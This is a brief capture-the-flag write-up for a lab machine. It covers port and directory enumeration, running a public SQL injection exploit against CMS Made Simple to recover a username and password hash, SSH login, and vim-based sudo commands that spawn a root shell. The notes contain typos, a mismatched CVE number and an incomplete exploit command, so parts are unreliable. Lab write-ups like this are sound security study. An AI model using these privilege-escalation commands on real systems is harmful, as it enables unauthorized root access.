## Enumeration:
nmap scan results:
![](attachments/simple%20ctf%20nmap%20detailed%20scan.png)


gobuster result:
![](attachments/simple%20ctf%20gobuster%20result.png)

/simple implements cms 2.4.8 which is vulnerable to sql injection based attack  CVE-2019-2053
 [exploit link](https://github.com/e-renna/CVE-2019-9053/blob/master/exploit.py)
modifying the cve to run on python3 not just on python
now running the exploit
python3 -u http://10.10.172.2/simple 
which starts bruteforcing 
![](attachments/simple%20ctf%20cred%20from%20exploit.png)

running ssh to user mitcuL at port 2222
did not let us log becaus eof the incorrect exploit
i ran the correct exploit and got this 
![](attachments/simple%20ctf%20exploit2.png)

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
which gave me the password secret


0c01f4468bd75d7a84c7eb73846e8d96
![](attachments/simple%20ctf%20privesc.png)

```
/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```
again this command did'nt run
```
sudo vim -c ':!/bin/sh'
```
 this ran and gave me root access

rootflag:
W3ll d0n3. You made it!

![](attachments/simple%20ctf%20root%20access.png)

